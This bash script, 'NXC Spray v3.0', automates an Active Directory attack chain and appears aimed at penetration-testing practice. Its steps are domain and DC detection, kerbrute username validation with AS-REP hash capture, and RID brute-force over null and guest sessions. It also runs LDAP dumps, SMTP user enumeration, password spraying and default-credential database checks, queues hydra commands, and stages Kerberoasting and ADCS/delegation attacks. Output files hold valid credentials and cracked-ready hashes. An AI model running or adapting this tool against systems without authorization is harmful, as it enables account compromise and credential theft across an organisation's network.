#!/usr/bin/bash
# =============================================================================
# NXC Spray v3.0 — Modular Edition
# Created by 1337.codes
#
# Usage: bash nxc_spray.sh [options]    (run --help for full list)
#
# Module layout:
#   modules/utils.sh     - Colors, run_cmd, ANSI strip, phase queue, workers
#   modules/ports.sh     - Port scanning, protocol target files, kerbrute finder
#   modules/extras.sh    - --extras-only: advanced/vuln checks
#   modules/help.sh      - --help and --cheatsheet handlers
#   modules/args.sh      - CLI argument parsing
#   modules/init.sh      - init_boot(), validate(), print_startup_overview(), init_files()
#   modules/creds.sh     - Credential parsing and extraction
#   modules/users.sh     - User consolidation and output processing
#   modules/spray.sh     - spray(), nsr_spray(), anonymous_enum(), hydra commands
#   modules/kerberos.sh  - AS-REP roasting, Kerberoasting (ad_attacks)
#   modules/adcs.sh      - ad_attacks_post_validation: ADCS/certipy, delegation, vulns
#   modules/smb.sh       - smb_enum()
#   modules/ssh.sh       - ssh_enum(): banner, defaults, post-auth
#   modules/summary.sh   - summary()
#   modules/ldap.sh      - ldap_highlight, ldap_show_results, Phase 4.2 + retry
# =============================================================================

STARTUP_CMD="$0 $*"

# ── Resolve module directory from script location ────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Source all modules in dependency order ────────────────────────────────────
# utils first (defines colors, run_cmd, phase queue — everything else needs these)
# ports second (defines proto maps, kerbrute finder)
# help/extras before args (they check $1 and may exit early)
# args before init (init_files/validate use vars set by arg parsing)
# creds/users before spray (spray calls process_output)
# kerberos before adcs (ad_attacks called from ad_attacks_post_validation context)
# ldap last (uses ldap_show_results, which needs colors from utils)
source "$SCRIPT_DIR/modules/utils.sh"
source "$SCRIPT_DIR/modules/ports.sh"
source "$SCRIPT_DIR/modules/extras.sh"
source "$SCRIPT_DIR/modules/help.sh"
source "$SCRIPT_DIR/modules/args.sh"
source "$SCRIPT_DIR/modules/init.sh"
source "$SCRIPT_DIR/modules/creds.sh"
source "$SCRIPT_DIR/modules/users.sh"
source "$SCRIPT_DIR/modules/spray.sh"
source "$SCRIPT_DIR/modules/kerberos.sh"
source "$SCRIPT_DIR/modules/adcs.sh"
source "$SCRIPT_DIR/modules/smb.sh"
source "$SCRIPT_DIR/modules/ssh.sh"
source "$SCRIPT_DIR/modules/summary.sh"
source "$SCRIPT_DIR/modules/ldap.sh"

# ── Cleanup temp files on exit ────────────────────────────────────────────────
trap cleanup_temp_files EXIT

# ── Sudo cache — early so later commands don't prompt mid-scan ───────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}[*] This script requires sudo for some commands${NC}"
    echo -e "${YELLOW}[*] Please enter your password now to cache it:${NC}"
    sudo -v || { echo -e "${RED}[!] sudo failed${NC}"; exit 1; }
    while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null &
fi

# =============================================================================
# MAIN EXECUTION FLOW
# All function definitions are in modules/. This file is the sequencer only.
# =============================================================================

# ── Boot: banner + OUTDIR creation + resume state ────────────────────────────
# Must run AFTER args are parsed (so --resume is honoured) but BEFORE validate.
# init.sh sets OUTDIR/CREDS_FILE/etc at source time; init_boot() creates the dir.
init_boot

# ── Generate-only early exit (no target needed) ──────────────────────────────
if [[ "$GENERATE_ONLY" == true ]]; then
    init_files
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 1: USERNAME PREP                                   ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    if [[ -f "$USERS" ]]; then
        echo -e "${CYAN}[*] Generating username format variations from $USERS...${NC}"
        generate_username_formats "$USERS" "$OUTDIR/users_generated.txt"
        { cat "$USERS"; echo; cat "$OUTDIR/users_generated.txt"; echo; } 2>/dev/null \
            | sed '/^$/d' | sort -u > "$OUTDIR/users_all_formats.txt"
        cp "$OUTDIR/users_all_formats.txt" "./generatedusers.txt" 2>/dev/null || true
        echo -e "${GREEN}[+] Exported: $OUTDIR/users_all_formats.txt${NC}"
        echo -e "${GREEN}[+] Copied to CWD: ./generatedusers.txt${NC}"
    else
        echo -e "${RED}[X] Generate-only requires a users file (-U <file> or users.txt)${NC}"
        exit 1
    fi
    exit 0
fi

validate
print_startup_overview
init_files
build_proto_targets

# ── Extras-only early exit ────────────────────────────────────────────────────
# After port scan (extras needs open port list) but before phase logic.
if [[ "$EXTRAS_ONLY" == true ]]; then
    echo -e "${YELLOW}[!] EXTRAS-ONLY mode: running advanced/vuln modules only${NC}"
    run_extras_only
    exit 0
fi

# ── Auto-skip slow enum when credentials are already provided ────────────────
if [[ "${HAS_PASSWORDS}" == true || "${HAS_HASHES}" == true || -n "${COMBO_MODE}" ]]; then
    [[ "$FORCE_ANON_SCAN" != true ]] && SKIP_ENUM=true
fi

# ═══════════════════════════════════════════════════════════════════════════════
# DOMAIN AUTO-DETECTION
# ═══════════════════════════════════════════════════════════════════════════════
if [[ "$STANDALONE" == true ]]; then
    echo -e "${CYAN}[*] Standalone mode — skipping domain detection${NC}"
elif [[ -z "$DOMAIN" ]]; then
    echo -e "${CYAN}[*] Domain not set — attempting auto-detection from SMB targets...${NC}"

    if [[ ! -s "$OUTDIR/targets_smb.txt" ]]; then
        echo -e "${YELLOW}[!] No reachable SMB targets found yet — will retry after Phase 3${NC}"
    else
        # Run nxc smb against ALL confirmed SMB hosts at once
        _ad_raw=$(sudo nxc smb "$OUTDIR/targets_smb.txt" 2>/dev/null)
        # Find most-frequent domain (AD domains appear on multiple hosts; machine names appear once)
        _detected=$(printf '%s\n' "$_ad_raw" | grep -oP '\(domain:\K[^)]+' | \
            grep -iv 'WORKGROUP' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
        if [[ -n "$_detected" ]]; then
            DOMAIN="$_detected"
            echo -e "${GREEN}[+] Domain auto-detected: ${WHITE}$DOMAIN${NC}"
            # DC has signing:True — most reliable indicator
            DC_IP=$(printf '%s\n' "$_ad_raw" | awk -v dom="$DOMAIN" \
                '/signing:True/ && $0 ~ dom {for(i=1;i<=NF;i++) if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/){print $i;exit}}' | head -1)
            [[ -z "$DC_IP" ]] && DC_IP=$(printf '%s\n' "$_ad_raw" | grep "$DOMAIN" | \
                awk '{for(i=1;i<=NF;i++) if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {print $i;exit}}' | head -1)
            [[ -n "$DC_IP" ]] && \
                echo -e "${GREEN}[+] DC IP auto-detected: ${WHITE}$DC_IP${NC}  ${GRAY}(signing:True)${NC}" || \
                echo -e "${YELLOW}[!] Domain found but DC IP unclear — use -dc <ip> to specify${NC}"
            # Generate /etc/hosts for Kerberos FQDN resolution
            sudo nxc smb "$OUTDIR/targets_smb.txt" --generate-hosts-file "$OUTDIR/hosts.txt" 2>/dev/null
            if [[ -s "$OUTDIR/hosts.txt" ]]; then
                _added=0
                while IFS= read -r _hline; do
                    [[ -z "$_hline" || "$_hline" == \#* ]] && continue
                    _hip=$(awk '{print $1}' <<< "$_hline")
                    for _hname in $(awk '{for(i=2;i<=NF;i++) print $i}' <<< "$_hline"); do
                        if ! getent hosts "$_hname" &>/dev/null; then
                            echo "$_hip    $_hname" | sudo tee -a /etc/hosts >/dev/null
                            echo -e "${GREEN}[+] /etc/hosts: $_hip  $_hname${NC}"
                            _added=$((_added+1))
                        fi
                    done
                done < "$OUTDIR/hosts.txt"
                [[ "$_added" -eq 0 ]] && echo -e "${GREEN}[+] All hosts already in /etc/hosts${NC}"
            fi
        else
            echo -e "${YELLOW}[!] Could not auto-detect domain from SMB scan — will retry after Phase 3${NC}"
            echo -e "${GRAY}    Tip: -D <domain>  or  echo 'DOMAIN.LOCAL' > domain.txt${NC}"
        fi
    fi
    # -dc flag always overrides auto-detected DC_IP
    [[ -n "${SINGLE_DC:-}" ]] && DC_IP="$SINGLE_DC"

    # ── Clock sync — must happen as early as possible so all Kerberos operations succeed ──
    if [[ -n "$DC_IP" ]]; then
        if command -v ntpdate &>/dev/null; then
            echo -e "${CYAN}[*] Syncing clock with DC ($DC_IP) to prevent Kerberos clock skew...${NC}"
            _ntp_out=$(sudo ntpdate -u "$DC_IP" 2>&1)
            _ntp_rc=$?
            echo -e "${GRAY}    $_ntp_out${NC}"
            if [[ $_ntp_rc -eq 0 ]]; then
                echo -e "${GREEN}[+] Clock synced to $DC_IP${NC}"
            else
                echo -e "${YELLOW}[!] ntpdate returned non-zero — check NTP/UDP access to $DC_IP${NC}"
                echo -e "${YELLOW}    Kerberos tools may fail with KRB_AP_ERR_SKEW if clocks diverge >5 min${NC}"
            fi
        else
            echo -e "${YELLOW}[!] ntpdate not found — install with: apt install ntpdate${NC}"
            echo -e "${YELLOW}    Kerberos tools may fail with KRB_AP_ERR_SKEW if clocks diverge >5 min${NC}"
            echo -e "${GRAY}    Manual: sudo ntpdate -u '$DC_IP'${NC}"
        fi
    fi
    echo ""
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: USERNAME PREPARATION
# ═══════════════════════════════════════════════════════════════════════════════
echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║  PHASE 1: USERNAME PREP                                   ║${NC}"
echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

if [[ "$GENERATE_USERS" == true ]] && [[ -f "$USERS" ]]; then
    echo -e "${CYAN}[*] Generating username format variations from $USERS...${NC}"
    generate_username_formats "$USERS" "$OUTDIR/users_generated.txt"
    { cat "$USERS"; echo; cat "$OUTDIR/users_generated.txt"; echo; } 2>/dev/null \
        | sed '/^$/d' | sort -u > "$OUTDIR/users_all_formats.txt"
    format_count=$(wc -l < "$OUTDIR/users_all_formats.txt")
    echo -e "${GREEN}[+] Total usernames to test: $format_count${NC}\n"
else
    if [[ -f "$USERS" ]]; then
        { cat "$USERS"; echo; } | sed '/^$/d' > "$OUTDIR/users_all_formats.txt"
        echo -e "${CYAN}[*] Using $USERS directly (use -g to generate username variations)${NC}\n"
    fi
fi
[[ ! -f "$USERS" ]] && \
    echo -e "${YELLOW}[!] No user list found — provide users with -U or create users.txt${NC}\n"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: KERBRUTE VALIDATION
# ═══════════════════════════════════════════════════════════════════════════════
if [[ "$STANDALONE" == true ]]; then
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 2: KERBRUTE VALIDATION                             ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${YELLOW}[!] Skipping kerbrute (standalone mode — non-AD target)${NC}"
    if [[ "$GENERATE_USERS" == true ]] && [[ -s "$OUTDIR/users_all_formats.txt" ]]; then
        { cat "$OUTDIR/users_all_formats.txt"; echo; } | sed '/^$/d' > "$OUTDIR/users_validated.txt"
        echo -e "${GREEN}[+] Using $(wc -l < "$OUTDIR/users_validated.txt") generated usernames${NC}"
    elif [[ -f "$USERS" ]]; then
        { cat "$USERS"; echo; } | sed '/^$/d' > "$OUTDIR/users_validated.txt"
        echo -e "${GREEN}[+] Using $(wc -l < "$OUTDIR/users_validated.txt") users for spraying${NC}"
    fi
elif [[ "${SKIP_ENUM}" == true ]]; then
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 2: KERBRUTE VALIDATION                             ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${YELLOW}[!] Skipping kerbrute (credentials provided — user assumed valid)${NC}"
    [[ -f "$USERS" ]] && cp "$USERS" "$OUTDIR/users_validated.txt" && \
        echo -e "${GREEN}[+] Using provided user(s) for authenticated enumeration${NC}"
elif [[ -n "$KERBRUTE_BIN" ]] && [[ -n "$DOMAIN" ]] && [[ -s "$OUTDIR/users_all_formats.txt" ]]; then
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 2: KERBRUTE VALIDATION                             ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${CYAN}[*] Kerbrute: Finding valid AD usernames...${NC}"
    echo -e "${CYAN}[*] Testing $(wc -l < "$OUTDIR/users_all_formats.txt") usernames against $DOMAIN${NC}\n"
    queue_phase_cmd "$KERBRUTE_BIN userenum -d '$DOMAIN' --dc '$DC_IP' '$OUTDIR/users_all_formats.txt' --hash-file '$OUTDIR/asrep_kerbrute.txt'"
    $KERBRUTE_BIN userenum -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all_formats.txt" \
        --hash-file "$OUTDIR/asrep_kerbrute.txt" -t "$KERBRUTE_THREADS" 2>&1 \
        | tee "$OUTDIR/kerbrute_output.txt"
    grep -i "VALID USERNAME" "$OUTDIR/kerbrute_output.txt" \
        | sed -E 's/.*VALID USERNAME:\s+([^@]+)@.*/\1/' | sort -u > "$OUTDIR/valid_users_kerbrute.txt"
    grep -i "has no pre auth" "$OUTDIR/kerbrute_output.txt" \
        | sed -E 's/.*\[.\]\s+([^ ]+)\s+has no pre auth.*/\1/' | sort -u \
        >> "$OUTDIR/valid_users_kerbrute.txt"
    awk '/VALID USERNAME/ {for(i=1;i<=NF;i++) if($i ~ /@/) {split($i,a,"@"); print a[1]}}' \
        "$OUTDIR/kerbrute_output.txt" >> "$OUTDIR/valid_users_kerbrute.txt"
    sort -u "$OUTDIR/valid_users_kerbrute.txt" -o "$OUTDIR/valid_users_kerbrute.txt" 2>/dev/null
    sed -i '/^[[:space:]]*$/d' "$OUTDIR/valid_users_kerbrute.txt" 2>/dev/null
    valid_count=$(grep -c . "$OUTDIR/valid_users_kerbrute.txt" 2>/dev/null || echo 0)
    if [[ $valid_count -gt 0 ]]; then
        echo -e "\n${GREEN}[+] Kerbrute found $valid_count valid AD username(s)!${NC}"
        while read -r u; do [[ -n "$u" ]] && echo -e "    ${YELLOW}→ $u${NC}"; done \
            < "$OUTDIR/valid_users_kerbrute.txt"
        cp "$OUTDIR/valid_users_kerbrute.txt" "$OUTDIR/users_validated.txt"
        cat "$OUTDIR/valid_users_kerbrute.txt" >> "$ENUM_USERS"
    fi
    [[ -s "$OUTDIR/asrep_kerbrute.txt" ]] && \
        echo -e "${GREEN}[+] Kerbrute captured $(wc -l < "$OUTDIR/asrep_kerbrute.txt") AS-REP hash(es)!${NC}"
else
    echo -e "${YELLOW}[!] Skipping kerbrute validation:${NC}"
    [[ -z "$KERBRUTE_BIN" ]] && echo -e "    - kerbrute not found (set KERBRUTE=/path or install)"
    [[ -z "$DOMAIN" ]]       && echo -e "    - Domain not detected (create domain.txt)"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: USER ENUMERATION (anonymous — skipped if creds provided)
# ═══════════════════════════════════════════════════════════════════════════════
if [[ "${SKIP_ENUM}" != true ]]; then
    first_target=$(head -1 "$TARGET_ARG" 2>/dev/null || echo "$TARGET_ARG")
    if command -v ldapsearch &>/dev/null && [[ -z "$DOMAIN" ]]; then
        echo -e "${CYAN}[*] LDAP naming contexts (domain info)...${NC}"
        queue_phase_cmd "ldapsearch -x -H ldap://$first_target -s base namingcontexts"
        ldapsearch -x -H "ldap://$first_target" -s base namingcontexts 2>/dev/null \
            | tee "$OUTDIR/ldap_naming_contexts.txt"
        nc_domain=$(grep -i "defaultNamingContext" "$OUTDIR/ldap_naming_contexts.txt" 2>/dev/null \
            | sed 's/.*DC=//I' | sed 's/,DC=/./gI' | tr -d '[:space:]')
        if [[ -n "$nc_domain" ]]; then
            DOMAIN="$nc_domain"; DC_IP="$first_target"
            echo -e "${GREEN}[+] Domain auto-detected from LDAP: $DOMAIN${NC}"
        fi
        echo ""
    fi
fi

# Only skip anonymous enumeration when BOTH users AND credentials are provided
# If we have a password but no users, we still need anon enum to discover usernames
_has_both_user_and_cred=false
[[ "$HAS_USERS" == true && ( "$HAS_PASSWORDS" == true || "$HAS_HASHES" == true ) ]] && _has_both_user_and_cred=true

if [[ "${SKIP_ENUM}" == true && "$FORCE_ANON_SCAN" != true && "$_has_both_user_and_cred" == true ]]; then
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 3: USER ENUMERATION                                ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${YELLOW}[!] Skipping anonymous enumeration (user list + credentials provided)${NC}"
    echo -e "${YELLOW}[!] Will use authenticated enumeration in PHASE 8${NC}"
else
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 3: USER ENUMERATION (RID BRUTE + ANON)             ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${CYAN}[*] Password policy check...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --pass-pol" "$OUTDIR/password_policy.txt"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --pass-pol" "$OUTDIR/password_policy_guest.txt"
    grep -qi "Account Lockout Threshold" \
        "$OUTDIR/password_policy.txt" "$OUTDIR/password_policy_guest.txt" 2>/dev/null && \
        echo -e "${RED}[!] LOCKOUT POLICY DETECTED — check threshold before spraying!${NC}"
    echo -e "\n${CYAN}[*] Null/guest/anonymous sessions...${NC}"
    for _u in '' 'guest' 'anonymous'; do
        run_cmd "sudo nxc smb $TARGET_ARG -u '$_u' -p ''" | tee -a "$RESULTS" | while read -r line; do
            echo "$line"
            [[ "$line" == *"[+]"* ]] && echo "[smb-${_u:-null}] $line" >> "$OUTDIR/anon_access.txt"
        done
    done
fi

# RID brute — skipped in fast/credential mode unless --anonymous-scan
# Run RID brute when: not fast mode AND (no creds, OR no users, OR forced anon scan)
if [[ "$SKIP_ENUM" != true ]] && { [[ "$HAS_PASSWORDS" != true && "$HAS_HASHES" != true ]] || \
    [[ "$HAS_USERS" != true ]] || [[ "$FORCE_ANON_SCAN" == true ]]; }; then
    echo -e "\n${CYAN}[*] RID brute-force (null/guest/anonymous)...${NC}"
    for _u in '' 'guest' 'anonymous'; do
        echo -e "${CYAN}    Trying ${_u:-null} session...${NC}"
        run_cmd "sudo nxc smb $TARGET_ARG -u '$_u' -p '' --rid-brute" \
            "$OUTDIR/rid_brute_${_u:-null}.txt"
        found=$(grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' \
            "$OUTDIR/rid_brute_${_u:-null}.txt" 2>/dev/null | sort -u | wc -l)
        [[ $found -gt 0 ]] && {
            echo -e "${GREEN}[+] Found $found users via ${_u:-null} session${NC}"
            grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' \
                "$OUTDIR/rid_brute_${_u:-null}.txt" >> "$OUTDIR/users_found.txt"
        }
    done
    [[ -f "$OUTDIR/users_found.txt" ]] && sort -u "$OUTDIR/users_found.txt" \
        -o "$OUTDIR/users_found.txt" 2>/dev/null
    echo -e "${CYAN}[*] LDAP - Anonymous users...${NC}"
    run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG -u '' -p '' --users" \
        "$OUTDIR/ldap_anon_users.txt"
    [[ -s "$OUTDIR/anon_access.txt" ]] && {
        echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║            ANONYMOUS ACCESS FOUND                         ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        sort -u "$OUTDIR/anon_access.txt"
    }
else
    [[ "$SKIP_ENUM" != true ]] || \
        echo -e "${YELLOW}[!] Skipping RID brute (fast mode or credentials provided)${NC}"
fi

consolidate_users

# ── Late domain detection: parse from Phase 3 SMB banner (always written above) ──
# password_policy.txt is written even in fast mode and reliably contains
# (domain:SKYLARK.com) (signing:True) for every SMB host — best source available.
if [[ -z "$DOMAIN" && "$STANDALONE" != true ]]; then
    for _dpol in "$OUTDIR/password_policy.txt" "$OUTDIR/password_policy_guest.txt"; do
        [[ -s "$_dpol" ]] || continue
        _late_dom=$(grep -oP '\(domain:\K[^)]+' "$_dpol" | grep -iv 'WORKGROUP' | \
            sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
        if [[ -n "$_late_dom" ]]; then
            DOMAIN="$_late_dom"
            # Find DC: host with signing:True in the same domain
            DC_IP=$(grep 'signing:True' "$_dpol" 2>/dev/null | grep "$DOMAIN" | \
                awk '{print $2}' | head -1)
            [[ -z "$DC_IP" ]] && DC_IP=$(grep "$DOMAIN" "$_dpol" 2>/dev/null | \
                awk '{print $2}' | head -1)
            echo -e "${GREEN}[+] Domain detected from Phase 3 scan: ${WHITE}$DOMAIN${NC}"
            [[ -n "$DC_IP" ]] && echo -e "${GREEN}[+] DC IP: ${WHITE}$DC_IP${NC}  ${GRAY}(signing:True = DC)${NC}"
            [[ -n "${SINGLE_DC:-}" ]] && DC_IP="$SINGLE_DC"
            break
        fi
    done
    [[ -z "$DOMAIN" ]] && echo -e "${YELLOW}[!] Domain still not detected — use -D <domain> or create domain.txt${NC}"
fi
# ═══════════════════════════════════════════════════════════════════════════════
if [[ "$STANDALONE" == true ]]; then
    echo -e "${YELLOW}[!] Skipping PHASE 4: LDAP enumeration (standalone mode)${NC}"
elif [[ -n "$DOMAIN" ]] && [[ "$SKIP_ENUM" != true ]] && \
     { [[ "$HAS_PASSWORDS" != true && "$HAS_HASHES" != true ]] || \
       [[ "$FORCE_ANON_SCAN" == true ]]; }; then
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 4: LDAP USER ENUMERATION                           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    for _windap in windapsearch.py windapsearch; do
        command -v "$_windap" &>/dev/null && {
            echo -e "${CYAN}[*] windapsearch — enumerating users...${NC}"
            run_cmd "$_windap -d '$DOMAIN' --dc-ip '$DC_IP' -U" "$OUTDIR/windapsearch_users.txt"
            grep -oP 'sAMAccountName:\s*\K\S+' "$OUTDIR/windapsearch_users.txt" 2>/dev/null \
                >> "$ENUM_USERS"
            break
        }
    done
    for _getadu in impacket-GetADUsers GetADUsers.py; do
        command -v "$_getadu" &>/dev/null && {
            echo -e "${CYAN}[*] $_getadu — enumerating users...${NC}"
            run_cmd "$_getadu '$DOMAIN/' -dc-ip '$DC_IP' -all" "$OUTDIR/getadusers.txt"
            awk '/^Impacket|^\[|^Name\s|^----|^$|Copyright|Querying|Error/{next}
                 NF>=1 && $1~/^[a-zA-Z][a-zA-Z0-9._-]*$/{print $1}' \
                "$OUTDIR/getadusers.txt" 2>/dev/null >> "$ENUM_USERS"
            break
        }
    done
    consolidate_users
elif [[ -n "$DOMAIN" ]] && [[ "$SKIP_ENUM" == true ]]; then
    echo -e "${YELLOW}[!] Skipping PHASE 4: LDAP enumeration (fast mode)${NC}"
elif [[ -n "$DOMAIN" ]]; then
    echo -e "${YELLOW}[!] Skipping PHASE 4: Anonymous LDAP enumeration (credentials provided)${NC}"
fi

# ── Phase 4.2: Full LDAP domain dump (ldapsearch) ────────────────────────────
_LDAP_DUMP_DONE=false
ldap_dump_phase42

# ── --ldap mode: exit after dump, skip spray/post-enum ───────────────────────
if [[ "${LDAP_ONLY:-false}" == true ]]; then
    echo -e "\n${GREEN}[+] --ldap mode: LDAP dump complete. Skipping spray/post-enum.${NC}"
    echo -e "${GRAY}    Output: $OUTDIR/${NC}"
    exit 0
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4.5: SMTP / POP3 / IMAP ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════
if [[ -s "$OUTDIR/targets_smtp.txt" ]] || [[ -s "$OUTDIR/targets_pop3.txt" ]] || \
   [[ -s "$OUTDIR/targets_imap.txt" ]]; then
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 4.5: SMTP / POP3 / IMAP ENUMERATION               ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    SMTP_ENUM_USERS=""
    if [[ -s "$OUTDIR/users_validated.txt" ]]; then SMTP_ENUM_USERS="$OUTDIR/users_validated.txt"
    elif [[ -s "$OUTDIR/all_users_clean.txt" ]]; then SMTP_ENUM_USERS="$OUTDIR/all_users_clean.txt"
    elif [[ -f "$USERS" ]]; then SMTP_ENUM_USERS="$USERS"; fi
    if [[ -s "$OUTDIR/targets_smtp.txt" ]]; then
        first_smtp_target=$(head -1 "$OUTDIR/targets_smtp.txt")
        echo -e "${CYAN}[*] SMTP (port 25) is OPEN${NC}"
        if [[ -n "$SMTP_ENUM_USERS" ]] && command -v smtp-user-enum &>/dev/null; then
            run_cmd "smtp-user-enum -M VRFY -U '$SMTP_ENUM_USERS' -t '$first_smtp_target'" \
                "$OUTDIR/smtp_valid_users.txt"
        fi
        queue_phase_cmd "nmap -Pn -p 25 --script smtp-enum-users,smtp-commands $first_smtp_target"
        [[ -n "$SMTP_ENUM_USERS" ]] && \
            queue_phase_cmd "hydra -L $SMTP_ENUM_USERS -e nsr smtp://$first_smtp_target"
    fi
    [[ -s "$OUTDIR/targets_pop3.txt" ]] && {
        first_pop3=$(head -1 "$OUTDIR/targets_pop3.txt")
        echo -e "${CYAN}[*] POP3 (port 110) is OPEN${NC}"
        queue_phase_cmd "telnet $first_pop3 110"
        queue_phase_cmd "nmap -sT -p 110 --script pop3-capabilities $first_pop3"
    }
    [[ -s "$OUTDIR/targets_imap.txt" ]] && {
        first_imap=$(head -1 "$OUTDIR/targets_imap.txt")
        echo -e "${CYAN}[*] IMAP (port 143) is OPEN${NC}"
        queue_phase_cmd "nc $first_imap 143"
        queue_phase_cmd "nmap -sT -p 143 --script imap-capabilities $first_imap"
    }
    echo ""
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: NSR SPRAY (null/same/reverse — skipped if creds provided)
# ═══════════════════════════════════════════════════════════════════════════════
if [[ "$HAS_PASSWORDS" == true ]] || [[ "$HAS_HASHES" == true ]]; then
    echo -e "${YELLOW}[!] Skipping nsr spray (credentials already provided)${NC}"
else
    nsr_spray
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6: CREDENTIAL SPRAYING + DB CHECKS
# ═══════════════════════════════════════════════════════════════════════════════
echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║  PHASE 6: CREDENTIAL SPRAYING                             ║${NC}"
echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}"

# Web/DB open-port hints (http, https, postgres, redis, oracle)
_show_scan_only_hints "${TARGET_ARG:-}"

# DB default credential checks — always run when port open, no user creds needed
# MySQL, MSSQL, PostgreSQL, Redis: tests blank/default credentials (OSCP-safe)
db_default_checks

[[ "$ANON_ONLY" != true ]] && spray

generate_hydra_commands

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6B: SMB ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════
smb_enum

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6C: SSH ENUMERATION (banner, defaults, post-auth)
# ═══════════════════════════════════════════════════════════════════════════════
ssh_enum

# ── Phase 4.2 retry: re-run LDAP dump with credentials found in Phase 6 ──────
ldap_dump_retry

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: AD ATTACKS (AS-REP, Kerberoast, ADCS, delegation, vulns)
# ═══════════════════════════════════════════════════════════════════════════════
ad_attacks_post_validation || \
    echo -e "${YELLOW}[!] Continuing after AD ATTACKS errors (see above)${NC}"

consolidate_users || true

# ── Copy users_confirmed.txt to CWD immediately (before summary output) ──────
if [[ -s "$OUTDIR/confirmed_users.txt" ]]; then
    cp "$OUTDIR/confirmed_users.txt" "./users_confirmed.txt" 2>/dev/null && \
        echo -e "${GREEN}[+] users_confirmed.txt copied to CWD ($(wc -l < ./users_confirmed.txt) users)${NC}"
fi

summary || true

# ═══════════════════════════════════════════════════════════════════════════════
# FINAL OUTPUT
# ═══════════════════════════════════════════════════════════════════════════════
echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    ALL PHASES COMPLETE                    ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${CYAN}[*] OUTPUT FILES:${NC}"
echo -e "    ${WHITE}$OUTDIR/${NC}"
[[ -s "$OUTDIR/confirmed_users.txt" ]] && {
    if [[ "$STANDALONE" == true ]]; then
        echo -e "    ${YELLOW}$OUTDIR/confirmed_users.txt${NC}  - Confirmed users (original case)"
    else
        echo -e "    ${YELLOW}$OUTDIR/confirmed_users.txt${NC}  - Confirmed AD users (original case)"
    fi
}
[[ -s "$OUTDIR/all_users_clean.txt" ]] && \
    echo -e "    $OUTDIR/all_users_clean.txt  - All users (lowercase)"
[[ -s "$OUTDIR/found_creds.txt" ]]     && \
    echo -e "    ${GREEN}$OUTDIR/found_creds.txt${NC}       - Valid credentials"
[[ -s "$OUTDIR/kerberoast.txt" ]]      && \
    echo -e "    ${RED}$OUTDIR/kerberoast.txt${NC}       - Kerberoast hashes"
[[ -s "$OUTDIR/asrep_all.txt" ]]       && \
    echo -e "    ${RED}$OUTDIR/asrep_all.txt${NC}        - AS-REP hashes"
[[ -s "$OUTDIR/smb_share_access.txt" ]] && \
    echo -e "    $OUTDIR/smb_share_access.txt - SMB share access"

echo -e "\n${CYAN}[*] RESUME OPTIONS:${NC}"
